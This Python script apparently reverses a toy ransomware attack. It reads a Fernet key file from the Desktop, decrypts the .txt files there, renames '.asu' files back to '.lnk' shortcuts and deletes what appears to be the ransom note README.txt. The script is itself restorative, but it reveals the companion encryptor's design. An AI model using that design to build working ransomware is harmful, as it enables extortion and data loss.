from cryptography.fernet import Fernet
import os
import platform
import shutil

#Change to desktop
home_directory = os.path.expanduser("~")
desktop = os.path.join(home_directory, "Desktop")
os.chdir(desktop)

# Read the key from the file
with open("JANGAN-HAPUS-INI.key", "rb") as f:
    key = f.read()

# Create a Fernet object with the key
fernet = Fernet(key)

# Function to decrypt and print the content of text files on the Desktop
def decrypt_files():
    try:
        for root, dirs, files in os.walk(os.getcwd()):
            for file_name in files:
                if file_name.endswith(".txt") and file_name != "README.txt":
                    file_path = os.path.join(root, file_name)

                    with open(str(file_path), "rb") as f:
                        encrypted_data = f.read()

                    decrypted = fernet.decrypt(encrypted_data)

                    with open(str(file_path), "wb") as f:
                        f.write(decrypted)

                    print(f"Decrypted content of {file_name}")
    except FileNotFoundError:
        print("Error decrypting files. Desktop directory not found.")

# Change working directory to Desktop
# def change_to_desktop():
#     system = platform.system()

#     if system == "Windows":
#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
#     elif system == "Darwin":  # macOS
#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
#     elif system == "Linux":
#         # This assumes a standard GNOME desktop environment
#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
#     else:
#         print("Unsupported operating system.")
#         return

#     try:
#         os.chdir(desktop_path)
#         print(f"Changed working directory to Desktop: {desktop_path}")
#     except FileNotFoundError:
#         print(f"Desktop directory not found: {desktop_path}")
        
def revert_shortcut_extension(desktop_directory, old_extension, new_extension):
    try:
        # Ensure the Desktop directory exists
        if not os.path.exists(desktop_directory):
            print(f"Desktop directory not found: {desktop_directory}")
            return

        # List files on the desktop
        files = [f for f in os.listdir(desktop_directory) if os.path.isfile(os.path.join(desktop_directory, f))]

        # Revert shortcut files with the new extension to have the old extension
        for file_name in files:
            if file_name.lower().endswith(new_extension.lower()):
                old_path = os.path.join(desktop_directory, file_name)
                new_path = os.path.join(desktop_directory, f"{os.path.splitext(file_name)[0]}.{old_extension}")

                shutil.move(old_path, new_path)
                print(f"Reverted {file_name} to {os.path.basename(new_path)}")

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # Change working directory to Desktop
    # change_to_desktop()
    file_path = os.path.abspath("README.txt")

    # Specify the desktop directory, old extension, and new extension
    desktop_directory = os.path.join(os.path.expanduser("~"), "Desktop")
    old_extension = "lnk"  # Change to your desired old extension
    new_extension = ".asu"   # Change to your desired new extension

    # Call the function to revert shortcut extensions
    revert_shortcut_extension(desktop_directory, old_extension, new_extension)

    # Decrypt and print content of text files
    decrypt_files()

    # Remove readme.txt
    os.remove(file_path)
